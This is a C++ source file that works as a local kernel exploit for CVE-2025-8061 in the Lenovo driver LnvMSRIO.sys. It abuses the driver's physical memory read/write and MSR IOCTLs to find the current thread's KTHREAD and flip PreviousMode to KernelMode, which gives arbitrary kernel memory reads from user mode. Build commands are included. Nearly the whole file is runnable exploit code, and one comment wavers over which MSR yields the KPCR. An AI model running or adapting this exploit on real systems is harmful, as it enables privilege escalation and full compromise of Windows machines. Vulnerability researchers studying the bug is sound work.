/*
 * 04_previousmode.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — PreviousMode Abuse
 *
 * Goal: patch KTHREAD.PreviousMode from 1 (UserMode) to 0 (KernelMode)
 *       → NtReadVirtualMemory / NtWriteVirtualMemory no longer probe that
 *         addresses are in user space → arbitrary kernel VA read/write
 *         from a normal user-mode thread.
 *
 * Why is this powerful?
 * ─────────────────────
 * Every syscall that copies data to/from user space calls ProbeForRead /
 * ProbeForWrite which check:
 *   if (PreviousMode == UserMode) assert(address < MmUserProbeAddress);
 * With PreviousMode == KernelMode, the probe is skipped entirely.
 * Result: NtReadVirtualMemory(current_process, KERNEL_VA, buf, ...) succeeds.
 *
 * Algorithm
 * ─────────
 * Step 1 — Get System process CR3 (page-table base)
 *   Scan physical RAM for System _EPROCESS (PID=4).
 *   Read EPROCESS+0x28 = DirectoryTableBase = CR3 of System process.
 *   (All kernel VAs are identical in every process's upper VA half, so
 *   System CR3 works for translating any kernel VA.)
 *
 * Step 2 — Read KPCR VA via MSR
 *   MSR 0xC0000102 (IA32_KERNEL_GS_BASE) holds the KPCR VA when the CPU
 *   is in user mode (kernel saves it with SWAPGS on syscall entry).
 *
 * Step 3 — Page table walk: VA → PA
 *   Implements the x64 4-level paging walk using the physical-read primitive.
 *   Handles 1 GB pages (PDP large), 2 MB pages (PD large), 4 KB pages.
 *
 * Step 4 — Follow KPCR → KTHREAD
 *   KPCR+0x180 = start of embedded KPRCB.
 *   KPRCB+0x008 = CurrentThread (PKTHREAD*) → KPCR+0x188.
 *   Translate that pointer to PA, read the KTHREAD VA for our thread,
 *   verify with DISPATCHER_HEADER.Type == 6 (ThreadObject).
 *
 * Step 5 — Translate PreviousMode address
 *   KTHREAD.PreviousMode = +0x232 (stable across Win10 19041 → Win11 26100+).
 *   VaToPa(cr3, kthread_va + 0x232) → previousmode_pa.
 *
 * Step 6 — Patch + verify
 *   PhysWrite 0x00 → PreviousMode.
 *   Confirm with NtReadVirtualMemory(ntoskrnl_base) reading the MZ header.
 *
 * Step 7 — Restore
 *   PhysWrite 0x01 → PreviousMode. MUST always restore — an un-restored
 *   PreviousMode=0 causes every subsequent kernel copy to bypass probes,
 *   which destabilises the system.
 *
 * IOCTL layouts
 * ─────────────
 *   MSR read    0x9c402084   IN:{DWORD msr}                  OUT:{UINT64}
 *   Phys read   0x9c406104   IN:{UINT64 PA, DWORD AS, DWORD Count}  OUT:data
 *   Phys write  0x9c40a108   IN:{UINT64 PA, DWORD OT=1, DWORD AS, BYTE data[AS]}
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:04_previousmode.exe 04_previousmode.cpp
 *      /link kernel32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME       L"\\\\.\\WinMsrDev"
#define IOCTL_MSR_READ    0x9c402084u
#define IOCTL_PHYS_READ   0x9c406104u
#define IOCTL_PHYS_WRITE  0x9c40a108u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(%ls): error %lu\n", DEVICE_NAME, GetLastError());
        return false;
    }
    printf("[+] Device opened  handle=%p\n", g_dev);
    return true;
}

// ─── Physical primitives ─────────────────────────────────────────────────────

#pragma pack(push, 1)
struct MsrReadIn    { DWORD  Reg; };
struct MsrReadOut   { UINT64 Val; };
struct PhysReadIn   { UINT64 PA; DWORD AS; DWORD Count; };
struct PhysWriteIn1 { UINT64 PA; DWORD OT; DWORD AS; BYTE  Data; };
struct PhysWriteIn8 { UINT64 PA; DWORD OT; DWORD AS; UINT64 Data; };
#pragma pack(pop)

static bool ReadMSR(DWORD msr, uint64_t *out)
{
    MsrReadIn  in  = { msr };
    MsrReadOut res = {};
    DWORD got = 0;
    if (!DeviceIoControl(g_dev, IOCTL_MSR_READ,
                         &in, sizeof(in), &res, sizeof(res), &got, nullptr)
        || got < 8) return false;
    *out = res.Val;
    return true;
}

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), buf, len, &got, nullptr)
           && (got == len);
}

static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in = { pa, 8, 1 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && (got == 8);
}

static bool PhysWriteU8(uint64_t pa, uint8_t val)
{
    PhysWriteIn1 in = { pa, 1, 1, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

// ─── Page table walk: VA → PA ─────────────────────────────────────────────────
//
// x64 4-level paging layout for a VA:
//
//   63      48 47    39 38    30 29    21 20    12 11       0
//   ┌─────────┬────────┬────────┬────────┬────────┬──────────┐
//   │sign ext │ PML4 i │ PDPT i │  PD i  │  PT i  │  offset  │
//   └─────────┴────────┴────────┴────────┴────────┴──────────┘
//      16 b      9 b     9 b     9 b      9 b       12 b
//
// Each entry (PML4E/PDPTE/PDE/PTE) is 8 bytes:
//   bit  0     = Present (P)
//   bit  7     = Page Size (PS) — if set in PDPTE → 1 GB page
//                                  if set in PDE  → 2 MB page
//   bits[51:12] = physical page base address (4 KB aligned)
//
// We clear the low 12 bits of each entry to get the next table's PA.

static uint64_t VaToPa(uint64_t cr3, uint64_t va)
{
    // Strip noise from CR3 (PCID lives in bits[11:0], not part of PA)
    uint64_t pml4_pa = cr3 & ~0xFFFULL;

    auto idx = [&](int shift) { return (va >> shift) & 0x1FF; };

    // ── Level 1: PML4 ────────────────────────────────────────────────────────
    uint64_t pml4e = 0;
    if (!PhysReadU64(pml4_pa + idx(39) * 8, &pml4e) || !(pml4e & 1)) {
        printf("    [VaToPa] PML4E not present for VA=0x%016llX\n", va);
        return 0;
    }
    uint64_t pdpt_pa = pml4e & 0x000FFFFFFFFFF000ULL;

    // ── Level 2: PDPT ────────────────────────────────────────────────────────
    uint64_t pdpte = 0;
    if (!PhysReadU64(pdpt_pa + idx(30) * 8, &pdpte) || !(pdpte & 1)) {
        printf("    [VaToPa] PDPTE not present for VA=0x%016llX\n", va);
        return 0;
    }
    if (pdpte & 0x80) {  // 1 GB large page
        return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
    }
    uint64_t pd_pa = pdpte & 0x000FFFFFFFFFF000ULL;

    // ── Level 3: PD ──────────────────────────────────────────────────────────
    uint64_t pde = 0;
    if (!PhysReadU64(pd_pa + idx(21) * 8, &pde) || !(pde & 1)) {
        printf("    [VaToPa] PDE not present for VA=0x%016llX\n", va);
        return 0;
    }
    if (pde & 0x80) {  // 2 MB large page (common for ntoskrnl code sections)
        return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
    }
    uint64_t pt_pa = pde & 0x000FFFFFFFFFF000ULL;

    // ── Level 4: PT ──────────────────────────────────────────────────────────
    uint64_t pte = 0;
    if (!PhysReadU64(pt_pa + idx(12) * 8, &pte) || !(pte & 1)) {
        printf("    [VaToPa] PTE not present for VA=0x%016llX\n", va);
        return 0;
    }
    return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFFULL);
}

// ─── Find System EPROCESS → get CR3 ──────────────────────────────────────────
//
// EPROCESS offsets (stable across Win10 19041 → Win11 26100+):
//   +0x028  DirectoryTableBase (CR3, physical address)
//   +0x440  UniqueProcessId
//   +0x5A8  ImageFileName char[15]

#define EPROC_OFF_CR3   0x028u
#define EPROC_OFF_PID   0x440u
#define EPROC_OFF_FNAME 0x5A8u
#define SCAN_CHUNK      (1u << 20)


// ─── Physical memory range enumeration (VMware-safe) ─────────────────────────
// Reads valid RAM extents from the Windows kernel's physical memory resource
// map so we never request MmMapIoSpace() on VMware device MMIO pages.
// HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory\.Translated
// is a CM_RESOURCE_LIST with CmResourceTypeMemory (Type=8) entries.
//
// CM_PARTIAL_RESOURCE_DESCRIPTOR on x64:
//   +0   BYTE  Type
//   +1   BYTE  ShareDisposition
//   +2   WORD  Flags
//   +4   LARGE_INTEGER Start    (8 bytes)
//   +12  ULONG Length           (4 bytes)
//   +16  (padding to 20-byte record)

struct PhRange { uint64_t base, size; };

static int GetPhysRanges(PhRange *out, int cap)
{
    HKEY hKey = nullptr;
    const char *kpath =
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, kpath, 0, KEY_READ, &hKey)
            != ERROR_SUCCESS)
        return 0;

    DWORD type = 0, cb = 0;
    RegQueryValueExA(hKey, ".Translated", nullptr, &type, nullptr, &cb);
    if (!cb) { RegCloseKey(hKey); return 0; }

    auto *rbuf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb + 8);
    if (!rbuf) { RegCloseKey(hKey); return 0; }
    if (RegQueryValueExA(hKey, ".Translated", nullptr, &type, rbuf, &cb)
            != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, rbuf);
        RegCloseKey(hKey);
        return 0;
    }
    RegCloseKey(hKey);

    int n = 0;
    DWORD off = 0;
    if (off + 4 <= cb) {
        DWORD lcnt = *(DWORD*)(rbuf + off); off += 4;
        for (DWORD l = 0; l < lcnt && off + 16 <= cb; l++) {
            off += 8;               // InterfaceType(4) + BusNumber(4)
            off += 4;               // Version(2) + Revision(2)
            if (off + 4 > cb) break;
            DWORD dcnt = *(DWORD*)(rbuf + off); off += 4;
            for (DWORD d = 0; d < dcnt && off + 20 <= cb; d++, off += 20) {
                if (rbuf[off] != 8) continue;   // CmResourceTypeMemory = 8
                LARGE_INTEGER st = {};
                st.LowPart  = *(DWORD*)(rbuf + off + 4);
                st.HighPart = *(LONG*) (rbuf + off + 8);
                ULONG len   = *(DWORD*)(rbuf + off + 12);
                if (n < cap) {
                    out[n].base = (uint64_t)st.QuadPart;
                    out[n].size = (uint64_t)len;
                    n++;
                }
            }
        }
    }
    HeapFree(GetProcessHeap(), 0, rbuf);
    return n;
}

static uint64_t GetSystemCR3()
{
    PhRange ranges[32];
    int n = GetPhysRanges(ranges, 32);
    if (n == 0) {
        // Fallback: use actual installed RAM with NO extra buffer
        MEMORYSTATUSEX ms = { sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        ranges[0].base = 0x100000;
        ranges[0].size = 0x07F00000;  // [1 MB, 128 MB) — System EPROCESS always here
        n = 1;
    }
    auto *buf = (uint8_t*)VirtualAlloc(nullptr, 1<<20, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;
    uint64_t cr3 = 0;
    for (int ri = 0; ri < n && !cr3; ri++) {
        uint64_t rbase = ranges[ri].base;
        uint64_t rend  = ranges[ri].base + ranges[ri].size;
        if (rbase < 0x100000) rbase = 0x100000;
        rbase = (rbase + 0xFFFFF) & ~(uint64_t)0xFFFFF;  // align up to 1 MB
        for (uint64_t pa = rbase; pa < rend && !cr3; pa += 1<<20) {
            bool any_ok = false;
            for (DWORD pg = 0; pg < (1u<<20); pg += 0x1000) {
                if (PhysRead(pa+pg, buf+pg, 0x1000)) any_ok = true;
                else memset(buf+pg, 0, 0x1000);
            }
            if (!any_ok) continue;
            for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
                if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;
                if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
                uint64_t c = *(uint64_t*)(buf+off+0x028);
                if (c && !(c & 0xFFF)) { cr3 = c; break; }
            }
        }
    }
    VirtualFree(buf, 0, MEM_RELEASE);
    return cr3;
}

// ─── NtReadVirtualMemory (direct syscall wrapper via ntdll) ──────────────────

typedef LONG (NTAPI *pfnNtRVM)(HANDLE Process, PVOID Base, PVOID Buf,
                                SIZE_T Len, PSIZE_T Got);
static pfnNtRVM g_NtRVM = nullptr;
static pfnNtRVM g_NtWVM = nullptr;

static void InitNtFuncs()
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    g_NtRVM = (pfnNtRVM)GetProcAddress(ntdll, "NtReadVirtualMemory");
    g_NtWVM = (pfnNtRVM)GetProcAddress(ntdll, "NtWriteVirtualMemory");
}

// ─── Get ntoskrnl base (fast path via NtQuerySystemInformation) ───────────────

typedef LONG (NTAPI *pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);
struct RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section; PVOID MappedBase; PVOID ImageBase;
    ULONG  ImageSize, Flags, LoadOrderIndex, InitOrderIndex;
    ULONG  LoadCount, OffsetToFileName;
    CHAR   FullPathName[256];
};
struct RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
};

static uint64_t GetNtoskrnlBase()
{
    auto NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                            "NtQuerySystemInformation");
    if (!NtQSI) return 0;
    ULONG sz = 1 << 18;
    auto buf = (uint8_t *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
    while (NtQSI(11/*SystemModuleInformation*/, buf, sz, &sz) == (LONG)0xC0000004)
    {
        buf = (uint8_t *)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, sz *= 2);
    }
    auto *mods = (RTL_PROCESS_MODULES *)buf;
    uint64_t base = 0;
    for (ULONG i = 0; i < mods->NumberOfModules; i++) {
        const char *name = mods->Modules[i].FullPathName
                         + mods->Modules[i].OffsetToFileName;
        if (_stricmp(name, "ntoskrnl.exe") == 0 ||
            _stricmp(name, "ntkrnlmp.exe") == 0) {
            base = (uint64_t)(uintptr_t)mods->Modules[i].ImageBase;
            break;
        }
    }
    HeapFree(GetProcessHeap(), 0, buf);
    return base;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main()
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 04 - PreviousMode Abuse ===\n\n");

    if (!OpenDevice()) return 1;
    InitNtFuncs();

    // ── Step 1: get System CR3 ────────────────────────────────────────────────
    printf("[*] Scanning for System _EPROCESS to get CR3...\n");
    uint64_t cr3 = GetSystemCR3();
    if (!cr3) {
        printf("[-] Could not find System CR3\n");
        CloseHandle(g_dev); return 1;
    }
    printf("\n");

    // ── Step 2: read KPCR VA via MSR ─────────────────────────────────────────
    //
    // MSR 0xC0000102 = IA32_KERNEL_GS_BASE
    // In user mode:  this holds the KPCR virtual address (what SWAPGS will load
    //                into GS when entering kernel mode).
    // In kernel mode: GS already points to KPCR, and 0xC0000102 holds the saved
    //                 user GS. Since we're in user mode when issuing the IOCTL,
    //                 the driver reads the MSR in kernel context where this MSR
    //                 holds user GS... wait.
    //
    // Clarification: on x64 Windows, the KERNEL_GS_BASE (0xC0000102) always
    // holds the *other* GS base (the one not currently in use).
    // - In user mode:   GS_BASE (0xC0000101) = user TEB, KERNEL_GS_BASE = KPCR
    // - In kernel mode: GS_BASE = KPCR,  KERNEL_GS_BASE = user TEB (saved by SWAPGS)
    //
    // The driver executes in kernel mode and reads the MSR there, so it reads
    // the saved user TEB — NOT the KPCR.
    //
    // To get the KPCR, we read GS_BASE *while in user mode context*:
    // The correct MSR is 0xC0000101 (IA32_GS_BASE), read while in user mode.
    // But the driver switches to kernel, so GS_BASE there = KPCR.
    // → ReadMSR(0xC0000101) from kernel context = KPCR VA. ✓

    uint64_t kpcr_va = 0;
    if (!ReadMSR(0xC0000101, &kpcr_va) || !kpcr_va) {
        printf("[-] Failed to read GS_BASE (KPCR)\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] KPCR VA (GS_BASE from kernel) = 0x%016llX\n", kpcr_va);

    // Sanity: KPCR is always in kernel VA space
    if (kpcr_va < 0xFFFF000000000000ULL) {
        printf("[-] GS_BASE value looks like user TEB (0x%016llX) — wrong MSR?\n",
               kpcr_va);
        printf("    Trying KERNEL_GS_BASE (0xC0000102)...\n");
        if (!ReadMSR(0xC0000102, &kpcr_va) || kpcr_va < 0xFFFF000000000000ULL) {
            printf("[-] Neither MSR gives a kernel VA for KPCR\n");
            CloseHandle(g_dev); return 1;
        }
        printf("[+] KPCR VA (KERNEL_GS_BASE) = 0x%016llX\n", kpcr_va);
    }

    // ── Step 3: KPCR → KPRCB.CurrentThread ───────────────────────────────────
    //
    // KPCR layout (x64):
    //   +0x180  Prcb : _KPRCB (embedded, not a pointer)
    // KPRCB layout:
    //   +0x008  CurrentThread : PKTHREAD
    // So: *(PKTHREAD*)(KPCR + 0x188) = pointer to current KTHREAD

    // Pin ourselves to one logical CPU so CurrentThread is stable
    HANDLE hThread = GetCurrentThread();
    SetThreadAffinityMask(hThread, 1);           // CPU 0 only
    SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);

    uint64_t currentthread_ptr_va = kpcr_va + 0x188;
    printf("[*] VA of KPRCB.CurrentThread = 0x%016llX\n", currentthread_ptr_va);

    uint64_t currentthread_ptr_pa = VaToPa(cr3, currentthread_ptr_va);
    if (!currentthread_ptr_pa) {
        printf("[-] VaToPa failed for KPRCB.CurrentThread\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] PA of KPRCB.CurrentThread = 0x%016llX\n", currentthread_ptr_pa);

    // Read the pointer: *PA → kthread_va
    uint64_t kthread_va = 0;
    if (!PhysReadU64(currentthread_ptr_pa, &kthread_va) || !kthread_va) {
        printf("[-] Failed to read CurrentThread pointer\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] CurrentThread (KTHREAD VA) = 0x%016llX\n", kthread_va);

    // Verify: KTHREAD starts with DISPATCHER_HEADER, Type must be 6 (ThreadObject)
    uint64_t kthread_pa = VaToPa(cr3, kthread_va);
    if (!kthread_pa) {
        printf("[-] VaToPa failed for KTHREAD\n");
        CloseHandle(g_dev); return 1;
    }
    uint8_t hdr_type = 0;
    PhysRead(kthread_pa, &hdr_type, 1);
    printf("[+] KTHREAD PA = 0x%016llX  Header.Type = %u  %s\n\n",
           kthread_pa, hdr_type,
           hdr_type == 6 ? "(ThreadObject ✓)" : "(MISMATCH — scheduler switched threads)");

    if (hdr_type != 6) {
        printf("[-] KTHREAD validation failed. Try again — scheduler may have moved us.\n");
        CloseHandle(g_dev); return 1;
    }

    // ── Step 4: PreviousMode byte ─────────────────────────────────────────────
    //
    // KTHREAD.PreviousMode = KTHREAD + 0x232
    // This is a single byte (KPROCESSOR_MODE):
    //   0 = KernelMode  (skip ProbeForRead/Write on userspace VA check)
    //   1 = UserMode    (normal — enforce user-space boundaries)
    //
    // Patching it to 0 means the *current thread's* next syscalls will not
    // probe the user/kernel VA boundary.

    uint64_t prevmode_va = kthread_va + 0x232;
    uint64_t prevmode_pa = VaToPa(cr3, prevmode_va);
    if (!prevmode_pa) {
        printf("[-] VaToPa failed for PreviousMode\n");
        CloseHandle(g_dev); return 1;
    }

    uint8_t prevmode_orig = 0xFF;
    PhysRead(prevmode_pa, &prevmode_orig, 1);
    printf("[+] PreviousMode @ VA=0x%016llX  PA=0x%016llX\n",
           prevmode_va, prevmode_pa);
    printf("    Value (before) = %u  (%s)\n\n",
           prevmode_orig, prevmode_orig == 1 ? "UserMode — as expected" : "UNEXPECTED");

    if (prevmode_orig != 1) {
        printf("[!] PreviousMode is not UserMode — already patched or wrong offset\n");
        CloseHandle(g_dev); return 1;
    }

    // ── Step 5: get ntoskrnl base for the test ────────────────────────────────
    uint64_t ntoskrnl_base = GetNtoskrnlBase();
    if (!ntoskrnl_base) {
        printf("[-] Could not determine ntoskrnl base\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] ntoskrnl base (VA) = 0x%016llX\n\n", ntoskrnl_base);

    // Prove it's a protected address BEFORE patch
    printf("[*] NtReadVirtualMemory(ntoskrnl_base) BEFORE patch:\n");
    uint8_t probe[16] = {};
    SIZE_T  nread = 0;
    LONG    status = g_NtRVM(GetCurrentProcess(),
                              (PVOID)(uintptr_t)ntoskrnl_base,
                              probe, sizeof(probe), &nread);
    printf("    status=0x%08X  nread=%zu  %s\n\n",
           (unsigned)status, nread,
           status == 0 ? "SUCCESS (already readable?)" :
           "FAILED — kernel VA blocked as expected");

    // ── Step 6: patch PreviousMode ────────────────────────────────────────────
    printf("[*] Patching PreviousMode: 1 → 0...\n");
    if (!PhysWriteU8(prevmode_pa, 0x00)) {
        printf("[-] PhysWriteU8 failed: %lu\n", GetLastError());
        CloseHandle(g_dev); return 1;
    }

    uint8_t readback = 0xFF;
    PhysRead(prevmode_pa, &readback, 1);
    printf("    Value (after)  = %u  %s\n\n",
           readback, readback == 0 ? "[KernelMode ✓]" : "[write did not stick!]");

    if (readback != 0) {
        printf("[-] Patch failed\n");
        CloseHandle(g_dev); return 1;
    }

    // ── Step 7: demonstrate arbitrary kernel VA read ──────────────────────────
    //
    // NtReadVirtualMemory with a kernel VA:
    //   Normally:  ProbeForRead checks address < MmUserProbeAddress → fails
    //   Now:       PreviousMode == KernelMode → probe skipped → succeeds
    //
    // We read 64 bytes from ntoskrnl_base (= MZ PE header we know exists).

    printf("[*] NtReadVirtualMemory(ntoskrnl_base) AFTER patch:\n");
    uint8_t kernel_read[64] = {};
    nread = 0;
    status = g_NtRVM(GetCurrentProcess(),
                     (PVOID)(uintptr_t)ntoskrnl_base,
                     kernel_read, sizeof(kernel_read), &nread);
    printf("    status=0x%08X  nread=%zu\n", (unsigned)status, nread);

    if (status == 0 && nread > 0) {
        printf("    First 16 bytes of ntoskrnl.exe:\n    ");
        for (int i = 0; i < 16; i++) printf("%02X ", kernel_read[i]);
        printf("\n");
        printf("    MZ signature: %s\n\n",
               (kernel_read[0] == 'M' && kernel_read[1] == 'Z')
               ? "✓ (MZ found — kernel VA read CONFIRMED)" : "unexpected bytes");

        // Bonus: read an arbitrary offset deep inside ntoskrnl (proves it's not a fluke)
        uint8_t deep_read[8] = {};
        nread = 0;
        g_NtRVM(GetCurrentProcess(),
                (PVOID)(uintptr_t)(ntoskrnl_base + 0x1000),
                deep_read, sizeof(deep_read), &nread);
        printf("    ntoskrnl+0x1000: ");
        for (int i = 0; i < 8; i++) printf("%02X ", deep_read[i]);
        printf("\n\n");
    } else {
        printf("    FAILED (status 0x%08X)\n", (unsigned)status);
        printf("    PreviousMode offset may differ on this build.\n");
        printf("    Verify with: dt nt!_KTHREAD <ETHREAD_VA> PreviousMode\n\n");
    }

    // ── Step 8: RESTORE PreviousMode ─────────────────────────────────────────
    //
    // Critical: must restore to 1 (UserMode) before this thread does anything
    // else. Leaving PreviousMode == 0 is catastrophic — the kernel will not
    // probe any syscall buffer addresses for this thread, which can corrupt
    // kernel structures if any subsequent code passes bad pointers.

    printf("[*] Restoring PreviousMode: 0 → 1...\n");
    PhysWriteU8(prevmode_pa, 0x01);
    uint8_t restored = 0xFF;
    PhysRead(prevmode_pa, &restored, 1);
    printf("    Value (restored) = %u  %s\n\n",
           restored, restored == 1 ? "[UserMode ✓]" : "[FAILED TO RESTORE — REBOOT NOW]");

    // Restore thread settings
    SetThreadPriority(hThread, THREAD_PRIORITY_NORMAL);
    SetThreadAffinityMask(hThread, (DWORD_PTR)-1);

    CloseHandle(g_dev);
    printf("[+] Done.\n");
    return 0;
}
